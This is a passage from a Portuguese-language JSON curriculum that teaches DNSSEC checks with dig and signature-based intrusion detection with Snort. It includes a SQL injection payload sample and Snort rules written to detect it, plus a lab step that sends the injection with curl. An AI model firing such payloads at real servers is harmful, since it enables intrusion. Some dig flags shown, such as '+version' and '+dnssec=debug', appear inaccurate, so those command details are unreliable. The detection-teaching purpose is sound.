                            "name": "Verificar respostas DNSSEC com ferramentas",
                            "description": "Usar comandos como 'dig +dnssec' para inspecionar flags AD (Authenticated Data), assinaturas RRSIG e status de validação.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Preparar o ambiente e instalar ferramentas necessárias",
                                  "subSteps": [
                                    "Verifique se o BIND tools (incluindo dig) está instalado no seu sistema com suporte a DNSSEC.",
                                    "Instale ou atualize o pacote BIND tools via gerenciador de pacotes (ex: apt install dnsutils no Ubuntu/Debian).",
                                    "Confirme suporte DNSSEC executando 'dig +version' e procure por 'dnssec'.",
                                    "Configure resolv.conf para usar um resolvedor que valide DNSSEC, como 8.8.8.8 (Google Public DNS).",
                                    "Teste conectividade básica com 'dig example.com' para garantir funcionamento."
                                  ],
                                  "verification": "Execute 'dig +version' e confirme menção a DNSSEC; teste uma query simples sem erros.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Terminal Linux/Unix",
                                    "BIND tools (dnsutils)",
                                    "Acesso à internet"
                                  ],
                                  "tips": "Use um resolvedor público como 8.8.8.8 para validação automática; evite localhost se não configurado.",
                                  "learningObjective": "Configurar corretamente o ambiente para consultas DNSSEC seguras.",
                                  "commonMistakes": [
                                    "Não instalar versão com suporte DNSSEC",
                                    "Usar resolvedor sem validação",
                                    "Ignorar dependências de bibliotecas como OpenSSL"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Executar consulta DNSSEC básica com dig",
                                  "subSteps": [
                                    "Escolha um domínio com DNSSEC ativado, como 'www.google.com'.",
                                    "Execute o comando: 'dig +dnssec +multi A www.google.com @8.8.8.8'.",
                                    "Observe a seção ANSWER com registros RRSIG e flags.",
                                    "Repita para tipo DNSKEY: 'dig +dnssec DNSKEY google.com @8.8.8.8'.",
                                    "Salve a saída em um arquivo para análise: 'dig +dnssec A www.google.com > output.txt'."
                                  ],
                                  "verification": "A resposta dig mostra seção AUTHORITY com DNSKEY e RRSIG presente.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Comando dig",
                                    "Domínio de teste: www.google.com",
                                    "Resolvedor: 8.8.8.8"
                                  ],
                                  "tips": "Sempre use +dnssec e especifique resolvedor com @ para consistência; +multi para respostas completas.",
                                  "learningObjective": "Realizar queries DNSSEC corretas e capturar respostas detalhadas.",
                                  "commonMistakes": [
                                    "Esquecer +dnssec, resultando em resposta sem assinaturas",
                                    "Usar resolvedor sem suporte",
                                    "Não especificar tipo de registro"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Interpretar flags AD, RRSIG e status de validação",
                                  "subSteps": [
                                    "Identifique a flag 'ad' (Authenticated Data) no cabeçalho da resposta dig.",
                                    "Analise RRSIG: verifique campos como Type Covered, Algorithm, Labels, Original TTL, Signature Expiration.",
                                    "Confira DO flag (DNSSEC OK) na seção OPT.",
                                    "Compare DNSKEY na AUTHORITY com RRSIG para validar chain of trust.",
                                    "Use 'dig +short +dnssec' para visão rápida de validação."
                                  ],
                                  "verification": "Explique em voz alta ou anote: presença de 'ad' flag significa validação bem-sucedida.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Saída de dig salva em arquivo",
                                    "Documentação RFC 4034/6840"
                                  ],
                                  "tips": "Flag AD indica que o resolvedor validou; ausência não significa falha no domínio, mas no resolvedor.",
                                  "learningObjective": "Decodificar elementos chave de uma resposta DNSSEC válida.",
                                  "commonMistakes": [
                                    "Confundir AD com DO",
                                    "Ignorar data de expiração em RRSIG",
                                    "Não verificar algoritmo suportado"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Testar cenários de falha e validação avançada",
                                  "subSteps": [
                                    "Teste domínio com DNSSEC falhado: 'dig +dnssec A dnssec-failed.org @8.8.8.8'.",
                                    "Observe ausência de AD flag e possíveis erros SERVFAIL.",
                                    "Verifique chain com 'dig +dnssec DS _domainkey.dnssec-failed.org'.",
                                    "Use 'drill' ou 'dnsviz.net' para visualização complementar.",
                                    "Documente diferenças entre domínios válidos e inválidos."
                                  ],
                                  "verification": "Identifique corretamente por que AD flag está ausente em domínio falhado.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Domínio falhado: dnssec-failed.org",
                                    "Ferramenta drill (opcional)",
                                    "Site dnsviz.net"
                                  ],
                                  "tips": "Use domínios de teste controlados para cenários; valide com múltiplos resolvedores.",
                                  "learningObjective": "Diagnosticar problemas de validação DNSSEC em respostas.",
                                  "commonMistakes": [
                                    "Assumir falha do domínio sem checar resolvedor",
                                    "Ignorar lame delegation",
                                    "Não testar múltiplos tipos"
                                  ]
                                }
                              ],
                              "practicalExample": "Para verificar se o site da sua empresa (ex: empresa.com) usa DNSSEC corretamente: execute 'dig +dnssec +multi A www.empresa.com @8.8.8.8'. Procure AD flag no status, RRSIG na resposta A e DNSKEY na authority. Se AD presente e sem erros, está validado; caso contrário, investigue DS no parent zone.",
                              "finalVerifications": [
                                "Explicar o significado de flags AD e DO em uma resposta dig.",
                                "Identificar RRSIG válido em uma saída de dig fornecida.",
                                "Executar dig +dnssec em domínio novo e anotar elementos chave.",
                                "Diferenciar resposta válida vs. falhada usando dnssec-failed.org.",
                                "Configurar e usar resolvedor alternativo para confirmação.",
                                "Listar 3 campos críticos em RRSIG para validade."
                              ],
                              "assessmentCriteria": [
                                "Precisão na execução de comandos dig +dnssec (sem erros de sintaxe).",
                                "Correta interpretação de AD flag e RRSIG (90% acurácia).",
                                "Identificação de pelo menos 3 diferenças em cenários falhados.",
                                "Documentação clara de saídas com anotações.",
                                "Tempo de conclusão dentro do estimado com verificações independentes.",
                                "Aplicação em domínio real sem orientação."
                              ],
                              "crossCurricularConnections": [
                                "Criptografia: Entender algoritmos de assinatura em RRSIG (ex: RSA, ECDSA).",
                                "Redes: Conceitos de resolução DNS e hierarquia de zonas.",
                                "Programação: Automatizar verificações com scripts Bash/Python usando subprocess.",
                                "Segurança: Integração com PKI e chain of trust.",
                                "Análise de dados: Parsing de saídas textuais para relatórios."
                              ],
                              "realWorldApplication": "Administradores de rede usam isso diariamente para auditar domínios contra ataques de DNS spoofing/cache poisoning, garantindo integridade de tráfego em infraestruturas críticas como bancos ou serviços governamentais; ferramentas como dig +dnssec são padrão em SOCs para monitoramento proativo."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.3.2.3.3",
                            "name": "Diagnosticar falhas em DNSSEC",
                            "description": "Identificar e resolver problemas comuns como chaves expiradas, falhas na chain of trust ou configurações incorretas de DS records.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Preparar Ambiente e Coletar Informações Iniciais",
                                  "subSteps": [
                                    "Instale ferramentas necessárias como dig, drill ou dnssec-tools.",
                                    "Identifique o domínio alvo e obtenha o nameserver autoritativo usando 'dig NS domain.com'.",
                                    "Execute 'dig +dnssec domain.com' para obter flags RRSIG, DNSKEY e NSEC.",
                                    "Registre o output inicial em um arquivo de log para análise posterior.",
                                    "Verifique se o SOA tem a flag DNSSEC OK (DO bit)."
                                  ],
                                  "verification": "Confirme que o log contém dados DNSSEC completos sem erros de query.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Ferramenta dig ou drill",
                                    "Acesso a terminal Linux/Unix",
                                    "Domínio de teste com DNSSEC"
                                  ],
                                  "tips": "Use domínios públicos como example.com para testes iniciais; sempre inclua +dnssec ou +dnssec=debug.",
                                  "learningObjective": "Configurar ferramentas e coletar dados básicos de DNSSEC para diagnóstico.",
                                  "commonMistakes": [
                                    "Esquecer o flag +dnssec",
                                    "Usar resolver público sem DO bit",
                                    "Não logar outputs"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Diagnosticar Problemas em Chaves e Assinaturas",
                                  "subSteps": [
                                    "Analise DNSKEY records: identifique KSK (sep=1) e ZSK (sep=0), verifique datas de validade.",
                                    "Verifique RRSIG: confira se cobrem todos os tipos de records e datas de expiração.",
                                    "Use 'dnssec-checkds' ou 'dig DNSKEY domain.com' para checar chaves expiradas.",
                                    "Compare algoritmos suportados (RSASHA256, etc.) com chain of trust.",
                                    "Identifique mismatches como chaves órfãs ou assinaturas inválidas."
                                  ],
                                  "verification": "Liste todas as chaves com status (válida/expirada) e confirme cobertura de RRSIG.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "dnssec-tools",
                                    "Documentação RFC 4034/5011",
                                    "Calculadora de datas para expiração"
                                  ],
                                  "tips": "Chaves KSK rotacionam a cada 1-2 anos; foque em 'until' field nas RRSIG.",
                                  "learningObjective": "Identificar falhas em chaves criptográficas e assinaturas DNSSEC.",
                                  "commonMistakes": [
                                    "Confundir KSK com ZSK",
                                    "Ignorar rollover de chaves",
                                    "Não checar algoritmo de assinatura"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Verificar Chain of Trust e DS Records",
                                  "subSteps": [
                                    "Obtenha DS record do parent zone: 'dig DS domain.com @parent-ns'.",
                                    "Valide DS contra DNSKEY público: use 'dnssec-dsfromkey'.",
                                    "Trace a chain: verifique assinatura do parent DS até root.",
                                    "Use ferramentas como dnsviz.net ou 'drill -T' para visualização gráfica.",
                                    "Identifique breaks como DS ausente, hash incorreto ou keytag mismatch."
                                  ],
                                  "verification": "Confirme que DS matches DNSKEY e chain chega ao root sem quebras.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Nameservers parent (e.g., TLD)",
                                    "Ferramentas online: dnsviz.net, securdns.org",
                                    "RFC 4035"
                                  ],
                                  "tips": "Keytag é crucial; DS deve ter digest-type 2 (SHA-256); teste com domínios broken conhecidos.",
                                  "learningObjective": "Validar a cadeia de confiança DNSSEC de domínio ao root.",
                                  "commonMistakes": [
                                    "Query errada no parent NS",
                                    "Ignorar digest-type",
                                    "Não verificar root trust anchor"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Executar Testes Finais de Validação e Resolver",
                                  "subSteps": [
                                    "Teste validação completa: 'dig +cdflag +dnssec domain.com' ou 'dnssec-verify zonefile'.",
                                    "Simule resolver validante com 'stubby' ou online testers como dnssec-tools.net.",
                                    "Aplique correções: renove chaves com 'dnssec-keygen', re-assine zona.",
                                    "Re-teste após correções e documente passos de resolução.",
                                    "Reporte falhas comuns: expire keys, broken chain, config BIND wrong."
                                  ],
                                  "verification": "Validação passa 100% em múltiplos testers; log de resolução completo.",
                                  "estimatedTime": "35 minutos",
                                  "materials": [
                                    "BIND ou PowerDNS para simulação",
                                    "Online validators: intodns.com, dnssec-analyzer.verisignlabs.com"
                                  ],
                                  "tips": "Use labs como dnssec-guide.org para setup; sempre backup zona antes de mudanças.",
                                  "learningObjective": "Resolver falhas DNSSEC e validar correções end-to-end.",
                                  "commonMistakes": [
                                    "Não re-assinar após keygen",
                                    "Esquecer publish DS no parent",
                                    "Testar só com resolver não-validante"
                                  ]
                                }
                              ],
                              "practicalExample": "Para o domínio 'testsec.example.com', 'dig +dnssec' mostra RRSIG expirada (until: 2023-01-01). Verifique DNSKEY #12345 expirada, gere nova ZSK com dnssec-keygen, re-assine zona com dnssec-signzone, e atualize DS no registrar. Re-teste com dnsviz.net confirma chain válida.",
                              "finalVerifications": [
                                "Identifica corretamente chaves expiradas em output de dig.",
                                "Valida DS record match com DNSKEY usando dnssec-dsfromkey.",
                                "Traça chain of trust até root sem erros.",
                                "Resolve simulação de falha em lab ambiente.",
                                "Documenta diagnóstico em relatório estruturado.",
                                "Passa testes em 3+ validators online."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de falhas (chaves, chain, DS).",
                                "Uso correto de ferramentas e flags.",
                                "Profundidade de sub-steps executados.",
                                "Qualidade da documentação e logs.",
                                "Efetividade na resolução simulada.",
                                "Compreensão de conceitos RFC (explicação oral)."
                              ],
                              "crossCurricularConnections": [
                                "Criptografia: Gerenciamento de chaves assimétricas (KSK/ZSK).",
                                "Redes: Protocolos DNS e queries recursivas.",
                                "Segurança: Autenticação e integridade de dados.",
                                "Sistemas Operacionais: Configuração BIND/NSD.",
                                "Análise de Dados: Parsing de logs DNS."
                              ],
                              "realWorldApplication": "Em uma organização, diagnosticar DNSSEC falho previne ataques de DNS spoofing/cache poisoning, garantindo autenticação de sites, emails (DKIM/SPF) e APIs, evitando downtime ou breaches em infra crítica como bancos ou e-gov."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      }
                    ]
                  },
                  {
                    "id": "10.1.3.3",
                    "name": "Teoria de Detecção de Ataques de Rede",
                    "description": "Princípios de detecção de anomalias, assinaturas e aprendizado de máquina para identificar ataques em tráfego de rede.",
                    "individualConcepts": [
                      {
                        "id": "10.1.3.3.1",
                        "name": "Detecção Baseada em Assinaturas",
                        "description": "Princípios de identificação de ataques conhecidos por meio de padrões ou assinaturas específicas no tráfego de rede, comparando pacotes com bancos de dados de assinaturas pré-definidas.",
                        "specificSkills": [
                          {
                            "id": "10.1.3.3.1.1",
                            "name": "Compreender o conceito de assinaturas em detecção de intrusões",
                            "description": "Explicar como assinaturas são criadas a partir de padrões conhecidos de ataques, como sequências de bytes em pacotes maliciosos, e seu papel em sistemas como Snort.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Entender os Fundamentos de Detecção de Intrusões Baseada em Assinaturas",
                                  "subSteps": [
                                    "Pesquise a definição de detecção de intrusões (IDS) e seus tipos principais: baseada em assinaturas e baseada em anomalias.",
                                    "Identifique o papel das assinaturas como 'impressões digitais' de ataques conhecidos.",
                                    "Compare detecção baseada em assinaturas com detecção baseada em anomalias, destacando vantagens como precisão para ameaças conhecidas.",
                                    "Leia documentação introdutória sobre IDS como Snort.",
                                    "Anote diferenças chave em um diagrama mental."
                                  ],
                                  "verification": "Crie um resumo de 100 palavras explicando o que é detecção baseada em assinaturas e forneça um exemplo simples.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Documentação oficial do Snort (snort.org/docs)",
                                    "Artigo introdutório sobre IDS (ex: Cisco ou OWASP)"
                                  ],
                                  "tips": "Use analogias como 'assinatura de um vírus' para fixar o conceito.",
                                  "learningObjective": "Compreender o contexto e a importância das assinaturas na detecção de intrusões.",
                                  "commonMistakes": [
                                    "Confundir com detecção baseada em anomalias",
                                    "Ignorar limitações como zero-day attacks"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Analisar Padrões Conhecidos de Ataques para Identificar Assinaturas",
                                  "subSteps": [
                                    "Estude exemplos de ataques conhecidos, como SQL Injection ou buffer overflow, focando em padrões em tráfego de rede.",
                                    "Examine pacotes maliciosos usando Wireshark para identificar sequências de bytes únicas (ex: '/union select' em payloads).",
                                    "Aprenda sobre normalização de dados para criar assinaturas robustas (ex: ignorar case ou espaços).",
                                    "Documente 3 padrões comuns: strings em HTTP requests, portas específicas, protocolos anômalos.",
                                    "Pratique capturando tráfego benigno vs. malicioso para contrastar."
                                  ],
                                  "verification": "Capture e analise um pacote de exemplo malicioso, destacando a sequência de bytes que serve como assinatura.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Wireshark (ferramenta gratuita)",
                                    "Amostras de PCAPs maliciosos (ex: de sites como malware-traffic-analysis.net)",
                                    "Guia de ataques comuns (ex: OWASP Top 10)"
                                  ],
                                  "tips": "Filtre tráfego por protocolo (HTTP/TCP) para focar em padrões relevantes.",
                                  "learningObjective": "Identificar padrões em ataques conhecidos que formam a base de assinaturas.",
                                  "commonMistakes": [
                                    "Focar apenas em strings textuais, ignorando binários",
                                    "Não considerar variações de evasão como ofuscação"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Aprender o Processo de Criação de Assinaturas",
                                  "subSteps": [
                                    "Descreva o pipeline: coleta de dados → análise → extração de assinatura → teste → refinamento.",
                                    "Estude sintaxe de regras em Snort (ex: alert tcp any any -> any 80 (content:\"evil\"; msg:\"Ataque detectado\";)).",
                                    "Crie uma assinatura simples para um padrão conhecido, como um comando shellcode.",
                                    "Teste a assinatura em um ambiente simulado com tráfego falso.",
                                    "Refine para reduzir falsos positivos, adicionando contexto como direção de fluxo."
                                  ],
                                  "verification": "Escreva e valide uma regra Snort para detectar um padrão específico, executando-a em teste.",
                                  "estimatedTime": "40 minutos",
                                  "materials": [
                                    "Snort instalado em VM (Docker ou VirtualBox)",
                                    "Regras de exemplo do Snort Community Ruleset",
                                    "Editor de texto como VS Code"
                                  ],
                                  "tips": "Comece com 'content:\"string\"' e adicione opções como nocase para robustez.",
                                  "learningObjective": "Dominar os passos para criar assinaturas acionáveis a partir de padrões.",
                                  "commonMistakes": [
                                    "Regras muito genéricas causando falsos positivos",
                                    "Esquecer de especificar direção ou protocolo"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Explorar o Papel das Assinaturas em Sistemas como Snort",
                                  "subSteps": [
                                    "Instale e configure Snort em modo IDS.",
                                    "Analise como o engine de Snort processa pacotes: preprocessamento → matching de assinaturas → alertas.",
                                    "Monitore logs de alertas gerados por assinaturas ativas.",
                                    "Discuta limitações: assinaturas não detectam variantes desconhecidas.",
                                    "Pesquise atualizações de regras (ex: Emerging Threats) para manutenção."
                                  ],
                                  "verification": "Execute Snort com regras personalizadas e interprete um log de alerta gerado.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Snort VM ou container",
                                    "Regras atualizadas (pulledpork ou manual)",
                                    "Ferramenta de visualização de logs como Splunk Free ou ELK stack básico"
                                  ],
                                  "tips": "Use modo unificado2 para logs legíveis e teste com scapy para gerar tráfego.",
                                  "learningObjective": "Compreender a integração e operação de assinaturas em IDS reais.",
                                  "commonMistakes": [
                                    "Não configurar thresholds para alertas",
                                    "Ignorar performance impact de muitas regras"
                                  ]
                                }
                              ],
                              "practicalExample": "Usando Wireshark, capture um payload de SQL Injection como '1' UNION SELECT user,pass FROM admin--'. Extraia a assinatura 'UNION SELECT' com nocase, crie uma regra Snort: 'alert tcp any any -> any 80 (msg:\"SQLi Attempt\"; content:\"UNION SELECT\"; nocase; sid:1000001;)'. Teste injetando via curl em um servidor vulnerável e verifique o alerta no log do Snort.",
                              "finalVerifications": [
                                "Explique verbalmente ou por escrito como uma sequência de bytes se torna uma assinatura.",
                                "Crie uma assinatura para um ataque novo e teste-a sem erros.",
                                "Diferencie detecção por assinatura de machine learning em IDS.",
                                "Identifique 3 limitações reais das assinaturas.",
                                "Configure Snort para alertar em uma assinatura personalizada.",
                                "Analise um log de Snort e interprete um match de assinatura."
                              ],
                              "assessmentCriteria": [
                                "Precisão na definição e exemplos de assinaturas (90%+ acurácia).",
                                "Capacidade de criar regras Snort sintaticamente corretas e funcionais.",
                                "Compreensão de padrões de ataques com exemplos concretos.",
                                "Identificação correta de verificações e limitações.",
                                "Integração prática em ferramenta real como Snort.",
                                "Clareza em explicações e diagramas de processo."
                              ],
                              "crossCurricularConnections": [
                                "Programação: Uso de regex e pattern matching em Python/Perl para prototipagem de assinaturas.",
                                "Análise de Dados: Processamento de logs de rede com Pandas ou ELK para refinar assinaturas.",
                                "Redes: Conhecimentos de protocolos TCP/IP e Wireshark para captura de padrões.",
                                "Matemática: Conceitos de hashing e strings para unicidade de assinaturas.",
                                "Ética em TI: Discussão sobre privacidade em monitoramento de tráfego."
                              ],
                              "realWorldApplication": "Em um Security Operations Center (SOC), analistas usam assinaturas no Snort ou Suricata para detectar exploits conhecidos em tempo real, bloqueando ataques como ransomware ou DDoS em firewalls/IPS empresariais, protegendo infraestruturas críticas como bancos ou hospitais."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.3.3.1.2",
                            "name": "Analisar funcionamento de motores de detecção por assinaturas",
                            "description": "Descrever o processo de matching de assinaturas em tráfego de rede em tempo real, incluindo normalização de pacotes e redução de falsos positivos.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender os Fundamentos de Assinaturas em Motores de Detecção",
                                  "subSteps": [
                                    "Estude o conceito de assinaturas como padrões pré-definidos de ataques conhecidos (ex: Snort rules).",
                                    "Identifique componentes de uma assinatura: header, content, options (ex: msg, sid, rev).",
                                    "Analise exemplos de assinaturas para ataques comuns como SQL injection ou buffer overflow.",
                                    "Compare assinaturas stateful vs stateless em detecção de rede.",
                                    "Revise como assinaturas são armazenadas em bancos de regras (ex: rulesets do Emerging Threats)."
                                  ],
                                  "verification": "Crie uma assinatura simples para um payload conhecido e valide sua sintaxe usando um parser online ou ferramenta como Snort.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Documentação Snort oficial",
                                    "Exemplos de rules em GitHub (Snort rules repo)",
                                    "Editor de texto"
                                  ],
                                  "tips": "Comece com rules simples; foque em 'content' matching antes de opções avançadas.",
                                  "learningObjective": "Explicar o papel das assinaturas como base para detecção reativa em IDS/IPS.",
                                  "commonMistakes": [
                                    "Confundir assinaturas com heurísticas",
                                    "Ignorar a importância do SID único",
                                    "Não considerar contexto de protocolo"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Explorar Normalização de Pacotes no Tráfego de Rede",
                                  "subSteps": [
                                    "Defina normalização: processo de padronizar pacotes para matching consistente (ex: remoção de padding, decoding de encodings).",
                                    "Estude técnicas como reassemblagem de TCP streams e IP defragmentation.",
                                    "Analise normalizadores em ferramentas como Suricata ou Bro/Zeek.",
                                    "Simule normalização com Wireshark: capture tráfego e aplique filtros para fragmented packets.",
                                    "Discuta impactos de evasão via encoding (ex: Base64, URL encoding) e como normalização mitiga."
                                  ],
                                  "verification": "Capture um pacote fragmentado no Wireshark, aplique reassemblagem e confirme visualização normalizada.",
                                  "estimatedTime": "60 minutos",
                                  "materials": [
                                    "Wireshark instalado",
                                    "Tutoriais Wireshark sobre fragmentation",
                                    "pcaps de teste com evasões (ex: malicious.pcap do Snort community)"
                                  ],
                                  "tips": "Use 'Follow TCP Stream' no Wireshark para visualizar reassemblagem em ação.",
                                  "learningObjective": "Descrever como a normalização garante matching preciso independentemente de variações de rede.",
                                  "commonMistakes": [
                                    "Subestimar evasões de fragmentação",
                                    "Confundir normalização com criptografia",
                                    "Ignorar overhead de performance"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar o Processo de Matching em Tempo Real",
                                  "subSteps": [
                                    "Descreva o fluxo: captura de pacotes → pré-processamento → normalização → engine de matching (ex: Aho-Corasick para multi-pattern).",
                                    "Estude algoritmos de matching: Boyer-Moore, regex engines otimizados.",
                                    "Simule matching com Snort em modo IDS: rode em tráfego simulado e analise alerts.",
                                    "Examine paralelismo em motores multi-threaded para throughput em tempo real.",
                                    "Avalie métricas: latency de matching, taxa de pacotes por segundo (PPS)."
                                  ],
                                  "verification": "Execute Snort em um pcap de teste, gere alerts e explique qual assinatura matchou qual pacote.",
                                  "estimatedTime": "75 minutos",
                                  "materials": [
                                    "Snort instalado (Docker ou VM)",
                                    "pcap files com ataques conhecidos",
                                    "snort.conf configurado para inline mode"
                                  ],
                                  "tips": "Use '-T' para test mode no Snort para validar rules sem tráfego real.",
                                  "learningObjective": "Mapear o pipeline de matching desde captura até alerta em cenários de alta velocidade.",
                                  "commonMistakes": [
                                    "Ignorar pré-filtros para otimização",
                                    "Confundir matching superficial com deep packet inspection",
                                    "Não considerar estado de sessão"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Investigar Técnicas de Redução de Falsos Positivos",
                                  "subSteps": [
                                    "Identifique causas de FPs: assinaturas genéricas, tráfego legítimo similar a ataques.",
                                    "Estude mitigações: thresholds, whitelists, contexto (ex: user-agent, geolocation).",
                                    "Analise tuning de rules: ajuste 'threshold' e 'detection_filter' no Snort.",
                                    "Simule FPs: teste rules em tráfego benigno e refine para minimizar.",
                                    "Discuta machine learning híbrido para supressão de FPs em engines modernas."
                                  ],
                                  "verification": "Gere 5 FPs intencionais, aplique tuning e confirme redução para <5% em dataset de teste.",
                                  "estimatedTime": "50 minutos",
                                  "materials": [
                                    "Snort rules editor",
                                    "Datasets benignos (ex: MAWI traffic archive)",
                                    "Ferramentas como RuleSurfer para análise"
                                  ],
                                  "tips": "Sempre teste pós-tuning com mix de benigno/malicioso para validar.",
                                  "learningObjective": "Aplicar estratégias para otimizar precisão sem sacrificar recall.",
                                  "commonMistakes": [
                                    "Over-tuning levando a falsos negativos",
                                    "Ignorar contexto de aplicação",
                                    "Não documentar mudanças em rules"
                                  ]
                                }
                              ],
                              "practicalExample": "Usando Snort em uma VM: capture tráfego HTTP simulado com payload malicioso (ex: shellcode em POST), normalize o stream, match com rule personalizada para 'cmd.exe', tune threshold para evitar FP em uploads legítimos, e gere relatório de alertas analisando o motor.",
                              "finalVerifications": [
                                "Explicar verbalmente o fluxo completo: captura → normalização → matching → alert.",
                                "Criar e testar uma rule customizada que detecta evasão via fragmentação.",
                                "Identificar e mitigar 3 FPs em um pcap real.",
                                "Comparar performance de matching em 2 engines (Snort vs Suricata).",
                                "Diagrama do pipeline de um motor de assinaturas.",
                                "Simular tempo real matching com 1000 PPS."
                              ],
                              "assessmentCriteria": [
                                "Precisão na descrição de normalização (80%+ cobertura de técnicas).",
                                "Capacidade de simular e debugar matching em ferramenta real.",
                                "Eficácia em reduzir FPs (demonstrado em teste).",
                                "Uso correto de terminologia (ex: hyperscan, multi-pattern matcher).",
                                "Integração de conceitos em análise holística.",
                                "Criatividade em exemplos práticos."
                              ],
                              "crossCurricularConnections": [
                                "Programação: Implementar matching simples em Python (re module, Aho-Corasick lib).",
                                "Redes: Protocolos TCP/IP e reassemblagem (CCNA level).",
                                "Estatística: Cálculo de precisão/recall em detecção.",
                                "Algoritmos: Strings matching e automatos finitos.",
                                "Ética: Implicações de privacidade em DPI."
                              ],
                              "realWorldApplication": "Em um SOC de uma empresa, analisar logs de Suricata para investigar incidentes, tunar rules para reduzir alert fatigue em 40%, e proteger rede corporativa contra exploits zero-day conhecidos via updates de assinaturas."
                            },
                            "estimatedTime": "3 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.3.3.1.3",
                            "name": "Identificar vantagens e limitações da detecção por assinaturas",
                            "description": "Discutir prós como alta precisão para ameaças conhecidas e contras como ineficácia contra ataques zero-day e evasão por ofuscação.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender os Fundamentos da Detecção por Assinaturas",
                                  "subSteps": [
                                    "Defina detecção por assinaturas como a comparação de tráfego de rede com padrões pré-definidos de ameaças conhecidas.",
                                    "Explique como assinaturas são criadas a partir de análise de malware ou exploits conhecidos.",
                                    "Diferencie de outros métodos como detecção baseada em anomalias ou heurística.",
                                    "Revise exemplos de assinaturas simples, como strings em payloads de pacotes."
                                  ],
                                  "verification": "Escreva uma definição clara e liste 2 exemplos de assinaturas; compare com detecção por anomalias.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Artigo sobre IDS/IPS (ex: Snort documentation)",
                                    "Vídeo introdutório sobre detecção de intrusões (YouTube ou Khan Academy)"
                                  ],
                                  "tips": "Use analogia de impressão digital para facilitar compreensão.",
                                  "learningObjective": "Entender o mecanismo básico de matching de assinaturas em tráfego de rede.",
                                  "commonMistakes": [
                                    "Confundir assinaturas com heurísticas; assumir que detecta tudo"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Identificar e Explicar as Vantagens",
                                  "subSteps": [
                                    "Liste a alta precisão para ameaças conhecidas, com baixa taxa de falsos positivos.",
                                    "Discuta a velocidade de detecção devido a matching exato.",
                                    "Explique a facilidade de implementação e atualização via bases de assinaturas públicas.",
                                    "Destaque a confiabilidade em ambientes controlados com ameaças previsíveis."
                                  ],
                                  "verification": "Crie uma tabela com 3 vantagens e justificativas; teste explicando para um par.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Lista de regras Snort (snort.org/rules)",
                                    "Ferramenta Wireshark para visualizar tráfego"
                                  ],
                                  "tips": "Associe cada vantagem a um cenário real, como detecção de worms conhecidos.",
                                  "learningObjective": "Reconhecer cenários onde detecção por assinaturas é superior.",
                                  "commonMistakes": [
                                    "Ignorar falsos positivos em assinaturas mal calibradas; superestimar velocidade em alto volume"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar as Limitações e Desvantagens",
                                  "subSteps": [
                                    "Descreva ineficácia contra ataques zero-day sem assinaturas pré-existentes.",
                                    "Explique vulnerabilidade a evasão por ofuscação, polimorfismo ou empacotamento.",
                                    "Discuta sobrecarga de atualizações constantes e falsos positivos/negativos.",
                                    "Avalie limitações em tráfego criptografado onde assinaturas não acessam payload."
                                  ],
                                  "verification": "Liste 4 limitações com exemplos; simule um ataque evasivo em diagrama.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Relatórios de CVE sobre zero-days (cve.mitre.org)",
                                    "Simulador de rede como GNS3 ou Packet Tracer"
                                  ],
                                  "tips": "Pesquise casos reais como evasão em Conficker para ilustrar.",
                                  "learningObjective": "Identificar contextos onde o método falha.",
                                  "commonMistakes": [
                                    "Subestimar impacto de criptografia; confundir com limitações de hardware"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Sintetizar Vantagens e Limitações em Contextos Práticos",
                                  "subSteps": [
                                    "Compare prós e contras em uma matriz SWOT.",
                                    "Discuta quando usar em conjunto com outros métodos (híbrido).",
                                    "Crie um caso de estudo simples de rede corporativa.",
                                    "Avalie trade-offs em termos de custo-benefício."
                                  ],
